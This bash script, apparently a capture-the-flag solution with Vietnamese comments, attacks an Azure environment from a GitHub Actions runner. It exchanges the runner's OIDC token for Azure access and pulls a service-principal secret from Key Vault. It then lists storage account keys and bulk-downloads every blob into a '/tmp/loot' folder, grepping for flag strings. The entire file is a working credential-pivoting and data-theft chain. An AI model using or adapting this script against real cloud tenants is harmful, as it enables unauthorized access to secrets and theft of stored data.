#!/usr/bin/env bash
set -uo pipefail
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
exch(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=$1" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" | jq -r '.access_token // empty'; }
spt(){ curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$1" -d "client_secret=$2" -d "scope=$3" -d "grant_type=client_credentials" | jq -r '.access_token // empty'; }

KV=$(exch "https://vault.azure.net/.default")
J=$(curl -sS -H "Authorization: Bearer $KV" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4" | jq -r '.value')
AID=$(echo "$J"|jq -r '.appId'); SEC=$(echo "$J"|jq -r '.clientSecret')
ARM=$(spt "$AID" "$SEC" "https://management.azure.com/.default")
RES=$(curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01")
FLAGRE='[A-Za-z0-9_]{1,10}\{[^}]{3,160}\}'
mkdir -p /tmp/loot

for ACCT in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  RID=$(echo "$RES"|jq -r ".value[]|select(.name==\"$ACCT\")|.id")
  K=$(curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" "https://management.azure.com$RID/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
  [ -z "$K" ] && { echo "### $ACCT: no key"; continue; }
  echo "### $ACCT: key OK ###"
  for c in $(az storage container list --account-name "$ACCT" --account-key "$K" --query '[].name' -o tsv --only-show-errors 2>/dev/null); do
    for b in $(az storage blob list --account-name "$ACCT" --account-key "$K" -c "$c" --query '[].name' -o tsv --only-show-errors 2>/dev/null); do
      f=/tmp/loot/$(echo "${ACCT}__${c}__${b}" | tr '/ ' '__')
      az storage blob download --account-name "$ACCT" --account-key "$K" -c "$c" -n "$b" -f "$f" --no-progress --only-show-errors >/dev/null 2>&1
      m=$(grep -aoE "$FLAGRE" "$f" 2>/dev/null | head -5)
      [ -n "$m" ] && echo ">>> MATCH $ACCT/$c/$b : $m"
      # in full nội dung blob KHÔNG thuộc loot (do đề đặt, text nhỏ)
      if [ "$c" != "loot" ] && file "$f" | grep -qi text; then
        echo "----- $ACCT/$c/$b -----"; head -c 1500 "$f"; echo
      fi
    done
  done
done
echo "========= TAT CA MATCH flag-pattern ========="
grep -raoE "$FLAGRE" /tmp/loot 2>/dev/null | sort -u
